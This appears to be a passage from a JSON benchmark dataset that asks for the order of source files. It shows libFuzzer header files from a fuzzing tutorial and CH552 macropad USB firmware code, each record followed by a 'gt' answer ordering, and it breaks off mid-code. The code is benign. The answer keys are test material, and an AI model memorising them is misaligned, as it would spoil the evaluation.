            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCommand.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'"
        ],
        "content": "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerIO.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_IO_H\n#define LLVM_FUZZER_IO_H\n\n#include \"FuzzerDefs.h\"\n\nnamespace fuzzer {\n\nlong GetEpoch(const std::string &Path);\n\nUnit FileToVector(const std::string &Path, size_t MaxSize = 0,\n                  bool ExitOnError = true);\n\nstd::string FileToString(const std::string &Path);\n\nvoid CopyFileToErr(const std::string &Path);\n\nvoid WriteToFile(const uint8_t *Data, size_t Size, const std::string &Path);\n\nvoid WriteToFile(const std::string &Data, const std::string &Path);\nvoid WriteToFile(const Unit &U, const std::string &Path);\n\nvoid ReadDirToVectorOfUnits(const char *Path, Vector<Unit> *V,\n                            long *Epoch, size_t MaxSize, bool ExitOnError);\n\n\nstd::string DirPlusFile(const std::string &DirPath,\n                        const std::string &FileName);\n\n\nstd::string DirName(const std::string &FileName);\n\n\nstd::string TmpDir();\n\nstd::string TempPath(const char *Extension);\n\nbool IsInterestingCoverageFile(const std::string &FileName);\n\nvoid DupAndCloseStderr();\n\nvoid CloseStdout();\n\nvoid Printf(const char *Fmt, ...);\nvoid VPrintf(bool Verbose, const char *Fmt, ...);\n\n\nvoid RawPrint(const char *Str);\n\n\nbool IsFile(const std::string &Path);\nsize_t FileSize(const std::string &Path);\n\nvoid ListFilesInDirRecursive(const std::string &Dir, long *Epoch,\n                             Vector<std::string> *V, bool TopDir);\n\nvoid RmDirRecursive(const std::string &Dir);\n\n\n\n\nvoid IterateDirRecursive(const std::string &Dir,\n                         void (*DirPreCallback)(const std::string &Dir),\n                         void (*DirPostCallback)(const std::string &Dir),\n                         void (*FileCallback)(const std::string &Dir));\n\nstruct SizedFile {\n  std::string File;\n  size_t Size;\n  bool operator<(const SizedFile &B) const { return Size < B.Size; }\n};\n\nvoid GetSizedFilesFromDir(const std::string &Dir, Vector<SizedFile> *V);\n\nchar GetSeparator();\n\nstd::string Basename(const std::string &Path);\n\nFILE* OpenFile(int Fd, const char *Mode);\n\nint CloseFile(int Fd);\n\nint DuplicateFile(int Fd);\n\nvoid RemoveFile(const std::string &Path);\nvoid RenameFile(const std::string &OldPath, const std::string &NewPath);\n\nvoid DiscardOutput(int Fd);\n\nintptr_t GetHandleFromFd(int fd);\n\nvoid MkDir(const std::string &Path);\nvoid RmDir(const std::string &Path);\n\nconst std::string &getDevNull();\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_MUTATE_H\n#define LLVM_FUZZER_MUTATE_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerDictionary.h\"\n#include \"FuzzerOptions.h\"\n#include \"FuzzerRandom.h\"\n\nnamespace fuzzer {\n\nclass MutationDispatcher {\npublic:\n  MutationDispatcher(Random &Rand, const FuzzingOptions &Options);\n  ~MutationDispatcher() {}\n\n  void StartMutationSequence();\n\n  void PrintMutationSequence();\n\n  void RecordSuccessfulMutationSequence();\n\n  size_t Mutate_Custom(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CustomCrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ShuffleBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_EraseBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertRepeatedBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBit(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CopyPart(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromManualDictionary(uint8_t *Data, size_t Size,\n                                            size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromTORC(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromPersistentAutoDictionary(uint8_t *Data, size_t Size,\n                                                    size_t MaxSize);\n\n\n  size_t Mutate_ChangeASCIIInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBinaryInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_CrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n  size_t Mutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n\n  size_t MutateWithMask(uint8_t *Data, size_t Size, size_t MaxSize,\n                        const Vector<uint8_t> &Mask);\n\n\n\n  size_t DefaultMutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t CrossOver(const uint8_t *Data1, size_t Size1, const uint8_t *Data2,\n                   size_t Size2, uint8_t *Out, size_t MaxOutSize);\n\n  void AddWordToManualDictionary(const Word &W);\n\n  void PrintRecommendedDictionary();\n\n  void SetCrossOverWith(const Unit *U) { CrossOverWith = U; }\n\n  Random &GetRand() { return Rand; }\n\n private:\n  struct Mutator {\n    size_t (MutationDispatcher::*Fn)(uint8_t *Data, size_t Size, size_t Max);\n    const char *Name;\n  };\n\n  size_t AddWordFromDictionary(Dictionary &D, uint8_t *Data, size_t Size,\n                               size_t MaxSize);\n  size_t MutateImpl(uint8_t *Data, size_t Size, size_t MaxSize,\n                    Vector<Mutator> &Mutators);\n\n  size_t InsertPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                      size_t ToSize, size_t MaxToSize);\n  size_t CopyPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                    size_t ToSize);\n  size_t ApplyDictionaryEntry(uint8_t *Data, size_t Size, size_t MaxSize,\n                              DictionaryEntry &DE);\n\n  template <class T>\n  DictionaryEntry MakeDictionaryEntryFromCMP(T Arg1, T Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const Word &Arg1, const Word &Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const void *Arg1, const void *Arg2,\n                                             const void *Arg1Mutation,\n                                             const void *Arg2Mutation,\n                                             size_t ArgSize,\n                                             const uint8_t *Data, size_t Size);\n\n  Random &Rand;\n  const FuzzingOptions Options;\n\n\n  Dictionary ManualDictionary;\n\n\n  Dictionary TempAutoDictionary;\n\n\n  Dictionary PersistentAutoDictionary;\n\n  Vector<DictionaryEntry *> CurrentDictionaryEntrySequence;\n\n  static const size_t kCmpDictionaryEntriesDequeSize = 16;\n  DictionaryEntry CmpDictionaryEntriesDeque[kCmpDictionaryEntriesDequeSize];\n  size_t CmpDictionaryEntriesDequeIdx = 0;\n\n  const Unit *CrossOverWith = nullptr;\n  Vector<uint8_t> MutateInPlaceHere;\n  Vector<uint8_t> MutateWithMaskTemp;\n\n\n  Vector<uint8_t> CustomCrossOverInPlaceHere;\n\n  Vector<Mutator> Mutators;\n  Vector<Mutator> DefaultMutators;\n  Vector<Mutator> CurrentMutatorSequence;\n};\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCommand.h'\n:\n\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_COMMAND_H\n#define LLVM_FUZZER_COMMAND_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n\n#include <algorithm>\n#include <sstream>\n#include <string>\n#include <vector>\n\nnamespace fuzzer {\n\nclass Command final {\npublic:\n\n\n\n  static inline const char *ignoreRemainingArgs() {\n    return \"-ignore_remaining_args=1\";\n  }\n\n  Command() : CombinedOutAndErr(false) {}\n\n  explicit Command(const Vector<std::string> &ArgsToAdd)\n      : Args(ArgsToAdd), CombinedOutAndErr(false) {}\n\n  explicit Command(const Command &Other)\n      : Args(Other.Args), CombinedOutAndErr(Other.CombinedOutAndErr),\n        OutputFile(Other.OutputFile) {}\n\n  Command &operator=(const Command &Other) {\n    Args = Other.Args;\n    CombinedOutAndErr = Other.CombinedOutAndErr;\n    OutputFile = Other.OutputFile;\n    return *this;\n  }\n\n  ~Command() {}\n\n\n\n  bool hasArgument(const std::string &Arg) const {\n    auto i = endMutableArgs();\n    return std::find(Args.begin(), i, Arg) != i;\n  }\n\n\n\n  const Vector<std::string> &getArguments() const { return Args; }\n\n\n\n  void addArgument(const std::string &Arg) {\n    Args.insert(endMutableArgs(), Arg);\n  }\n\n\n\n  void addArguments(const Vector<std::string> &ArgsToAdd) {\n    Args.insert(endMutableArgs(), ArgsToAdd.begin(), ArgsToAdd.end());\n  }\n\n\n\n  void removeArgument(const std::string &Arg) {\n    auto i = endMutableArgs();\n    Args.erase(std::remove(Args.begin(), i, Arg), i);\n  }\n\n\n  bool hasFlag(const std::string &Flag) const {\n    std::string Arg(\"-\" + Flag + \"=\");\n    auto IsMatch = [&](const std::string &Other) {\n      return Arg.compare(0, std::string::npos, Other, 0, Arg.length()) == 0;\n    };\n    return std::any_of(Args.begin(), endMutableArgs(), IsMatch);\n  }\n\n\n\n\n  std::string getFlagValue(const std::string &Flag) const {\n    std::string Arg(\"-\" + Flag + \"=\");\n    auto IsMatch = [&](const std::string &Other) {\n      return Arg.compare(0, std::string::npos, Other, 0, Arg.length()) == 0;\n    };\n    auto i = endMutableArgs();\n    auto j = std::find_if(Args.begin(), i, IsMatch);\n    std::string result;\n    if (j != i) {\n      result = j->substr(Arg.length());\n    }\n    return result;\n  }\n\n\n  void addFlag(const std::string &Flag, const std::string &Value) {\n    addArgument(\"-\" + Flag + \"=\" + Value);\n  }\n\n\n  void removeFlag(const std::string &Flag) {\n    std::string Arg(\"-\" + Flag + \"=\");\n    auto IsMatch = [&](const std::string &Other) {\n      return Arg.compare(0, std::string::npos, Other, 0, Arg.length()) == 0;\n    };\n    auto i = endMutableArgs();\n    Args.erase(std::remove_if(Args.begin(), i, IsMatch), i);\n  }\n\n\n  bool hasOutputFile() const { return !OutputFile.empty(); }\n\n\n  const std::string &getOutputFile() const { return OutputFile; }\n\n\n  void setOutputFile(const std::string &FileName) { OutputFile = FileName; }\n\n\n  bool isOutAndErrCombined() const { return CombinedOutAndErr; }\n\n\n  void combineOutAndErr(bool combine = true) { CombinedOutAndErr = combine; }\n\n\n\n  std::string toString() const {\n    std::stringstream SS;\n    for (auto arg : getArguments())\n      SS << arg << \" \";\n    if (hasOutputFile())\n      SS << \">\" << getOutputFile() << \" \";\n    if (isOutAndErrCombined())\n      SS << \"2>&1 \";\n    std::string result = SS.str();\n    if (!result.empty())\n      result = result.substr(0, result.length() - 1);\n    return result;\n  }\n\nprivate:\n  Command(Command &&Other) = delete;\n  Command &operator=(Command &&Other) = delete;\n\n  Vector<std::string>::iterator endMutableArgs() {\n    return std::find(Args.begin(), Args.end(), ignoreRemainingArgs());\n  }\n\n  Vector<std::string>::const_iterator endMutableArgs() const {\n    return std::find(Args.begin(), Args.end(), ignoreRemainingArgs());\n  }\n\n\n  Vector<std::string> Args;\n\n\n  bool CombinedOutAndErr;\n\n\n  std::string OutputFile;\n};\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_DICTIONARY_H\n#define LLVM_FUZZER_DICTIONARY_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n#include \"FuzzerUtil.h\"\n#include <algorithm>\n#include <limits>\n\nnamespace fuzzer {\n\ntemplate <size_t kMaxSizeT> class FixedWord {\npublic:\n  static const size_t kMaxSize = kMaxSizeT;\n  FixedWord() {}\n  FixedWord(const uint8_t *B, uint8_t S) { Set(B, S); }\n\n  void Set(const uint8_t *B, uint8_t S) {\n    assert(S <= kMaxSize);\n    memcpy(Data, B, S);\n    Size = S;\n  }\n\n  bool operator==(const FixedWord<kMaxSize> &w) const {\n    return Size == w.Size && 0 == memcmp(Data, w.Data, Size);\n  }\n\n  static size_t GetMaxSize() { return kMaxSize; }\n  const uint8_t *data() const { return Data; }\n  uint8_t size() const { return Size; }\n\nprivate:\n  uint8_t Size = 0;\n  uint8_t Data[kMaxSize];\n};\n\ntypedef FixedWord<64> Word;\n\nclass DictionaryEntry {\n public:\n  DictionaryEntry() {}\n  DictionaryEntry(Word W) : W(W) {}\n  DictionaryEntry(Word W, size_t PositionHint) : W(W), PositionHint(PositionHint) {}\n  const Word &GetW() const { return W; }\n\n  bool HasPositionHint() const { return PositionHint != std::numeric_limits<size_t>::max(); }\n  size_t GetPositionHint() const {\n    assert(HasPositionHint());\n    return PositionHint;\n  }\n  void IncUseCount() { UseCount++; }\n  void IncSuccessCount() { SuccessCount++; }\n  size_t GetUseCount() const { return UseCount; }\n  size_t GetSuccessCount() const {return SuccessCount; }\n\n  void Print(const char *PrintAfter = \"\\n\") {\n    PrintASCII(W.data(), W.size());\n    if (HasPositionHint())\n      Printf(\"@%zd\", GetPositionHint());\n    Printf(\"%s\", PrintAfter);\n  }\n\nprivate:\n  Word W;\n  size_t PositionHint = std::numeric_limits<size_t>::max();\n  size_t UseCount = 0;\n  size_t SuccessCount = 0;\n};\n\nclass Dictionary {\n public:\n  static const size_t kMaxDictSize = 1 << 14;\n\n  bool ContainsWord(const Word &W) const {\n    return std::any_of(begin(), end(), [&](const DictionaryEntry &DE) {\n      return DE.GetW() == W;\n    });\n  }\n  const DictionaryEntry *begin() const { return &DE[0]; }\n  const DictionaryEntry *end() const { return begin() + Size; }\n  DictionaryEntry & operator[] (size_t Idx) {\n    assert(Idx < Size);\n    return DE[Idx];\n  }\n  void push_back(DictionaryEntry DE) {\n    if (Size < kMaxDictSize)\n      this->DE[Size++] = DE;\n  }\n  void clear() { Size = 0; }\n  bool empty() const { return Size == 0; }\n  size_t size() const { return Size; }\n\nprivate:\n  DictionaryEntry DE[kMaxDictSize];\n  size_t Size = 0;\n};\n\n\n\n\nbool ParseOneDictionaryEntry(const std::string &Str, Unit *U);\n\n\nbool ParseDictionaryFile(const std::string &Text, Vector<Unit> *Units);\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_UTIL_H\n#define LLVM_FUZZER_UTIL_H\n\n#include \"FuzzerBuiltins.h\"\n#include \"FuzzerBuiltinsMsvc.h\"\n#include \"FuzzerCommand.h\"\n#include \"FuzzerDefs.h\"\n\nnamespace fuzzer {\n\nvoid PrintHexArray(const Unit &U, const char *PrintAfter = \"\");\n\nvoid PrintHexArray(const uint8_t *Data, size_t Size,\n                   const char *PrintAfter = \"\");\n\nvoid PrintASCII(const uint8_t *Data, size_t Size, const char *PrintAfter = \"\");\n\nvoid PrintASCII(const Unit &U, const char *PrintAfter = \"\");\n\n\n\nbool ToASCII(uint8_t *Data, size_t Size);\n\nbool IsASCII(const Unit &U);\n\nbool IsASCII(const uint8_t *Data, size_t Size);\n\nstd::string Base64(const Unit &U);\n\nvoid PrintPC(const char *SymbolizedFMT, const char *FallbackFMT, uintptr_t PC);\n\nstd::string DescribePC(const char *SymbolizedFMT, uintptr_t PC);\n\nvoid PrintStackTrace();\n\nvoid PrintMemoryProfile();\n\nunsigned NumberOfCpuCores();\n\n\nvoid SetSignalHandler(const FuzzingOptions& Options);\n\nvoid SleepSeconds(int Seconds);\n\nunsigned long GetPid();\n\nsize_t GetPeakRSSMb();\n\nint ExecuteCommand(const Command &Cmd);\n\nFILE *OpenProcessPipe(const char *Command, const char *Mode);\n\nconst void *SearchMemory(const void *haystack, size_t haystacklen,\n                         const void *needle, size_t needlelen);\n\nstd::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                              const char *X1, const char *X2);\n\ninline std::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                                     const char *X) {\n  return CloneArgsWithoutX(Args, X, X);\n}\n\ninline std::pair<std::string, std::string> SplitBefore(std::string X,\n                                                       std::string S) {\n  auto Pos = S.find(X);\n  if (Pos == std::string::npos)\n    return std::make_pair(S, \"\");\n  return std::make_pair(S.substr(0, Pos), S.substr(Pos));\n}\n\nstd::string DisassembleCmd(const std::string &FileName);\n\nstd::string SearchRegexCmd(const std::string &Regex);\n\nsize_t SimpleFastHash(const uint8_t *Data, size_t Size);\n\ninline uint32_t Log(uint32_t X) { return 32 - Clz(X) - 1; }\n\ninline size_t PageSize() { return 4096; }\ninline uint8_t *RoundUpByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = (X + Mask) & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\ninline uint8_t *RoundDownByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = X & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\n\n}\n\n#endif\n",
        "gt": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerIO.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCommand.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'"
        ]
    },
    {
        "files": [
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.c'",
            "'CH552-MacroPad-plus/software/src/config.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'"
        ],
        "content": "'CH552-MacroPad-plus/software/src/usb_descr.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb.h\"\n#include \"config.h\"\n\n\n\n\n#define EP0_SIZE        8\n#define EP1_SIZE        8\n#define EP2_SIZE        8\n\n#define EP0_ADDR        0\n#define EP1_ADDR        (EP0_ADDR + EP0_BUF_SIZE)\n#define EP2_ADDR        (EP1_ADDR + EP1_BUF_SIZE)\n\n#define EP0_BUF_SIZE    EP_BUF_SIZE(EP0_SIZE)\n#define EP1_BUF_SIZE    EP_BUF_SIZE(EP1_SIZE)\n#define EP2_BUF_SIZE    EP_BUF_SIZE(EP2_SIZE)\n\n#define EP_BUF_SIZE(x)  (x+2<64 ? x+2 : 64)\n\n\n\n\ntypedef struct _USB_CFG_DESCR_HID {\n  USB_CFG_DESCR config;\n  USB_ITF_DESCR interface0;\n  USB_HID_DESCR hid0;\n  USB_ENDP_DESCR ep1IN;\n  USB_ENDP_DESCR ep2OUT;\n} USB_CFG_DESCR_HID, *PUSB_CFG_DESCR_HID;\ntypedef USB_CFG_DESCR_HID __xdata *PXUSB_CFG_DESCR_HID;\n\nextern __code USB_DEV_DESCR DevDescr;\nextern __code USB_CFG_DESCR_HID CfgDescr;\n\n\n\n\nextern __code uint8_t ReportDescr[];\nextern __code uint8_t ReportDescrLen;\n\n#define USB_REPORT_DESCR      ReportDescr\n#define USB_REPORT_DESCR_LEN  ReportDescrLen\n\n\n\n\nextern __code uint16_t LangDescr[];\nextern __code uint16_t ManufDescr[];\nextern __code uint16_t ProdDescr[];\nextern __code uint16_t SerDescr[];\nextern __code uint16_t InterfDescr[];\n\n#define USB_STR_DESCR_i0    (uint8_t*)LangDescr\n#define USB_STR_DESCR_i1    (uint8_t*)ManufDescr\n#define USB_STR_DESCR_i2    (uint8_t*)ProdDescr\n#define USB_STR_DESCR_i3    (uint8_t*)SerDescr\n#define USB_STR_DESCR_i4    (uint8_t*)InterfDescr\n#define USB_STR_DESCR_ix    (uint8_t*)SerDescr\n\n'CH552-MacroPad-plus/software/src/usb_handler.c'\n:\n\n\n\n#include \"ch554.h\"\n#include \"usb_handler.h\"\n\nuint16_t SetupLen;\nuint8_t  SetupReq, UsbConfig;\n__code uint8_t *pDescr;\n\n\n\n\n\n\n#pragma callee_saves USB_EP0_copyDescr\nvoid USB_EP0_copyDescr(uint8_t len) {\n  len;\n  __asm\n    push ar7                    ; r7 -> stack\n    mov  r7, dpl                ; r7 <- len\n    inc  _XBUS_AUX              ; select dptr1\n    mov  dptr, #_EP0_buffer     ; dptr1 <- EP0_buffer\n    dec  _XBUS_AUX              ; select dptr0\n    mov  dpl, _pDescr           ; dptr0 <- *pDescr\n    mov  dph, (_pDescr + 1)\n    01$:\n    clr  a                      ; acc <- #0\n    movc a, @a+dptr             ; acc <- *pDescr[dptr0]\n    inc  dptr                   ; inc dptr0\n    .DB  0xA5                   ; acc -> EP0_buffer[dptr1] & inc dptr1\n    djnz r7, 01$                ; repeat len times\n    pop  ar7                    ; r7 <- stack\n  __endasm;\n}\n\n\n\n\n\nvoid USB_EP0_SETUP(void) {\n  uint8_t len = USB_RX_LEN;\n  if(len == (sizeof(USB_SETUP_REQ))) {\n    SetupLen = ((uint16_t)USB_setupBuf->wLengthH<<8) | (USB_setupBuf->wLengthL);\n    len = 0;\n    SetupReq = USB_setupBuf->bRequest;\n\n    if( (USB_setupBuf->bRequestType & USB_REQ_TYP_MASK) != USB_REQ_TYP_STANDARD ) {\n      #ifdef USB_CTRL_NS_handler\n      len = USB_CTRL_NS_handler();\n      #else\n      len = 0xFF;\n      #endif\n    }\n\n    else {\n      switch(SetupReq) {\n        case USB_GET_DESCRIPTOR:\n          switch(USB_setupBuf->wValueH) {\n\n            case USB_DESCR_TYP_DEVICE:\n              pDescr = (uint8_t*)&DevDescr;\n              len = sizeof(DevDescr);\n              break;\n\n            case USB_DESCR_TYP_CONFIG:\n              pDescr = (uint8_t*)&CfgDescr;\n              len = sizeof(CfgDescr);\n              break;\n\n            case USB_DESCR_TYP_STRING:\n              switch(USB_setupBuf->wValueL) {\n                case 0:   pDescr = USB_STR_DESCR_i0; break;\n                case 1:   pDescr = USB_STR_DESCR_i1; break;\n                case 2:   pDescr = USB_STR_DESCR_i2; break;\n                case 3:   pDescr = USB_STR_DESCR_i3; break;\n                #ifdef USB_STR_DESCR_i4\n                case 4:   pDescr = USB_STR_DESCR_i4; break;\n                #endif\n                #ifdef USB_STR_DESCR_i5\n                case 5:   pDescr = USB_STR_DESCR_i5; break;\n                #endif\n                #ifdef USB_STR_DESCR_i6\n                case 6:   pDescr = USB_STR_DESCR_i6; break;\n                #endif\n                #ifdef USB_STR_DESCR_i7\n                case 7:   pDescr = USB_STR_DESCR_i7; break;\n                #endif\n                #ifdef USB_STR_DESCR_i8\n                case 8:   pDescr = USB_STR_DESCR_i8; break;\n                #endif\n                #ifdef USB_STR_DESCR_i9\n                case 9:   pDescr = USB_STR_DESCR_i9; break;\n                #endif\n                #ifdef USB_STR_DESCR_ixee\n                case 0xee: pDescr = USB_STR_DESCR_ixee; break;\n                #endif\n                default:  pDescr = USB_STR_DESCR_ix; break;\n              }\n              len = pDescr[0];\n              break;\n\n            #ifdef USB_REPORT_DESCR\n            case USB_DESCR_TYP_REPORT:\n              if(USB_setupBuf->wValueL == 0) {\n                pDescr = USB_REPORT_DESCR;\n                len = USB_REPORT_DESCR_LEN;\n              }\n              else len = 0xff;\n              break;\n            #endif\n\n            default:\n              len = 0xff;\n              break;\n          }\n\n          if(len != 0xff) {\n            if(SetupLen > len) SetupLen = len;\n            len = SetupLen >= EP0_SIZE ? EP0_SIZE : SetupLen;\n            USB_EP0_copyDescr(len);\n            SetupLen -= len;\n            pDescr += len;\n          }\n          break;\n\n        case USB_SET_ADDRESS:\n          SetupLen = USB_setupBuf->wValueL;\n          break;\n\n        case USB_GET_CONFIGURATION:\n          EP0_buffer[0] = UsbConfig;\n          if (SetupLen >= 1) len = 1;\n          break;\n\n        case USB_SET_CONFIGURATION:\n          UsbConfig = USB_setupBuf->wValueL;\n          break;\n\n        case USB_GET_INTERFACE:\n          break;\n\n        case USB_SET_INTERFACE:\n          break;\n\n        case USB_CLEAR_FEATURE:\n          if( (USB_setupBuf->bRequestType & 0x1F) == USB_REQ_RECIP_DEVICE ) {\n            if( ( ( (uint16_t)USB_setupBuf->wValueH << 8 ) | USB_setupBuf->wValueL ) == 0x01 ) {\n              if( ((uint8_t*)&CfgDescr)[7] & 0x20) {\n\n              }\n              else len = 0xFF;\n            }\n            else len = 0xFF;\n          }\n          else if( (USB_setupBuf->bRequestType & USB_REQ_RECIP_MASK) == USB_REQ_RECIP_ENDP ) {\n            switch(USB_setupBuf->wIndexL) {\n              #ifdef EP4_IN_callback\n              case 0x84:\n                UEP4_CTRL = UEP4_CTRL & ~ ( bUEP_T_TOG | MASK_UEP_T_RES ) | UEP_T_RES_NAK;\n                break;\n              #endif\n              #ifdef EP4_OUT_callback\n              case 0x04:\n                UEP4_CTRL = UEP4_CTRL & ~ ( bUEP_R_TOG | MASK_UEP_R_RES ) | UEP_R_RES_ACK;\n                break;\n              #endif\n              #ifdef EP3_IN_callback\n              case 0x83:\n                UEP3_CTRL = UEP3_CTRL & ~ ( bUEP_T_TOG | MASK_UEP_T_RES ) | UEP_T_RES_NAK;\n                break;\n              #endif\n              #ifdef EP3_OUT_callback\n              case 0x03:\n                UEP3_CTRL = UEP3_CTRL & ~ ( bUEP_R_TOG | MASK_UEP_R_RES ) | UEP_R_RES_ACK;\n                break;\n              #endif\n              #ifdef EP2_IN_callback\n              case 0x82:\n                UEP2_CTRL = UEP2_CTRL & ~ ( bUEP_T_TOG | MASK_UEP_T_RES ) | UEP_T_RES_NAK;\n                break;\n              #endif\n              #ifdef EP2_OUT_callback\n              case 0x02:\n                UEP2_CTRL = UEP2_CTRL & ~ ( bUEP_R_TOG | MASK_UEP_R_RES ) | UEP_R_RES_ACK;\n                break;\n              #endif\n              #ifdef EP1_IN_callback\n              case 0x81:\n                UEP1_CTRL = UEP1_CTRL & ~ ( bUEP_T_TOG | MASK_UEP_T_RES ) | UEP_T_RES_NAK;\n                break;\n              #endif\n              #ifdef EP1_OUT_callback\n              case 0x01:\n                UEP1_CTRL = UEP1_CTRL & ~ ( bUEP_R_TOG | MASK_UEP_R_RES ) | UEP_R_RES_ACK;\n                break;\n              #endif\n              default:\n                len = 0xFF;\n                break;\n            }\n          }\n          else len = 0xFF;\n          break;\n\n        case USB_SET_FEATURE:\n          if( (USB_setupBuf->bRequestType & 0x1F) == USB_REQ_RECIP_DEVICE ) {\n            if( ( ( (uint16_t)USB_setupBuf->wValueH << 8 ) | USB_setupBuf->wValueL ) == 0x01 ) {\n              if( !(((uint8_t*)&CfgDescr)[7] & 0x20) ) len = 0xFF;\n            }\n            else len = 0xFF;\n          }\n          else if( (USB_setupBuf->bRequestType & 0x1F) == USB_REQ_RECIP_ENDP ) {\n            if( ( ( (uint16_t)USB_setupBuf->wValueH << 8 ) | USB_setupBuf->wValueL ) == 0x00 ) {\n              switch( ( (uint16_t)USB_setupBuf->wIndexH << 8 ) | USB_setupBuf->wIndexL ) {\n                #ifdef EP4_IN_callback\n                case 0x84:\n                  UEP4_CTRL = UEP4_CTRL & (~bUEP_T_TOG) | UEP_T_RES_STALL;\n                  break;\n                #endif\n                #ifdef EP4_OUT_callback\n                case 0x04:\n                  UEP4_CTRL = UEP4_CTRL & (~bUEP_R_TOG) | UEP_R_RES_STALL;\n                  break;\n                #endif\n                #ifdef EP3_IN_callback\n                case 0x83:\n                  UEP3_CTRL = UEP3_CTRL & (~bUEP_T_TOG) | UEP_T_RES_STALL;\n                  break;\n                #endif\n                #ifdef EP3_OUT_callback\n                case 0x03:\n                  UEP3_CTRL = UEP3_CTRL & (~bUEP_R_TOG) | UEP_R_RES_STALL;\n                  break;\n                #endif\n                #ifdef EP2_IN_callback\n                case 0x82:\n                  UEP2_CTRL = UEP2_CTRL & (~bUEP_T_TOG) | UEP_T_RES_STALL;\n                  break;\n                #endif\n                #ifdef EP2_OUT_callback\n                case 0x02:\n                  UEP2_CTRL = UEP2_CTRL & (~bUEP_R_TOG) | UEP_R_RES_STALL;\n                  break;\n                #endif\n                #ifdef EP1_IN_callback\n                